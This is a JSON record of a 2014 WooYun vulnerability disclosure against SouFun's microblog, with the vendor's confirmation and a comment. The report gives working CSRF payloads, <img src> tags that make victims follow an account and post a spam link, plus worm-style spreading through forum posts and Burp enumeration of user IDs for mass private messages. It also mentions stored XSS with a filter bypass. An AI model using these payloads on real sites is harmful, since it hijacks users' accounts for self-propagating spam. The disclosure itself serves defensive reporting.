{"id": 2849, "wybug_id": "wooyun-2014-061534", "wybug_title": "搜房网微博多处安全漏洞礼包", "wybug_corp": "搜房网", "wybug_author": "小威", "wybug_date": "2014-06-03 12:00", "wybug_open_date": "2014-07-18 12:01", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "漏洞利用", "蠕虫"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-03：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-03：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-18：\t细节向公众公开  简要描述： RT-这应该是叫做csrf的！ 详细说明：  1.搜房微博发微处，发条微博抓包！此处\nhttp://t.soufun.com/post_add.php?&post_content=这里是内容&andComment=&toweibo=&oldComment=&pic_path=&7910560603827216\n直接为get数据提交，无任何验证设置。2.抓包“关注”同样得到get数据包！\nhttp://t.soufun.com/follow_add.php?follow_id=此处为注册用户ID&iframe=1&random=0.7860255646232082\n3.猥琐的想到此处可以蠕虫刷粉丝 -.-！4.首先得有施展的地方！于是一番转悠。发现论坛发帖和回帖可以发图，我们就可以找一些流量人气比较大的论坛，在发图时候以<img src>将get数据载入来实现我们的目的！\n<img src=\"http://t.soufun.com/follow_add.php?follow_id=46661553&amp;iframe=1&amp;random=0.9105442526532137;\" modifysize=\"36%\" diffpixels=\"3px\" style=\"width: 23px; height: 25px;\"><img src=\"http://t.soufun.com/post_add.php?&amp;post_content=%B5%F0%B1%AC%C1%CB%A3%AC%C1%C1%CF%B9%C1%CB%CE%D2%B5%C4%32%34%4B%EB%B4%20%BD%F0%B9%B7%D1%DB%68%74%74%70%3A%2F%2F%6A%69%6E%74%61%69%6C%69%73%68%65%2E%73%6F%75%66%75%6E%2E%63%6F%6D%2F%62%62%73%2F%31%30%31%30%37%33%37%30%34%39%7E%2D%31%2F%31%38%36%30%35%36%31%39%37%5F%31%38%36%30%35%36%31%39%37%5F%32%2E%68%74%6D%D5%E2%BE%B9%C8%BB%CA%C7%40%D3%EE%D6%E6%B5%DA%D2%BB%B4%F3%CB%A7%B8%E7&amp;andComment=&amp;toweibo=&amp;oldComment=&amp;pic_path=&amp;7990988821018783;\" modifysize=\"115%\" diffpixels=\"30px\" style=\"width: 20px; height: 23px;\">\n\n\n\n\n5.更猥琐的方式.. 抓包私信功能，是同样的get数据包\nhttp://t.soufun.com/pm_add.php?&pm_content=这里是内容&reader_uid=这里是用户ID&reader_name=&695832881602396\n6.祭出神器burp，通过对ID的1～N的爆破，来实现群发私信！\n\n7.看下刷蠕虫和刷粉的效果！刚刚动起来~~\n\n   漏洞证明：  接上面继续来，因为问题太罗嗦，索性一次性打包都发了吧！估计给个高Rank还是值得！搜房博客有两处XSS跨站。0.1 个人资料处存储型XSS.\n\n未进行任何过滤，所以打开博客后出现XSS证明：\n\n0.2 文章分类处存储型XSS.此处有对script过滤，但可绕过继续进行XSS\n\n证明：\n\n\n\n   修复方案：  token   版权声明：转载请注明来源 小威@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-06-03 14:55 厂商回复： 感谢您对搜房安全的关注，您发现的问题已经安排技术人员修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-07-21 15:21 |    \t\t嘟嘟丶小神奇 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 嘟嘟丶小神奇)\t\t \n  5 Rank 洞主有点悲催    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}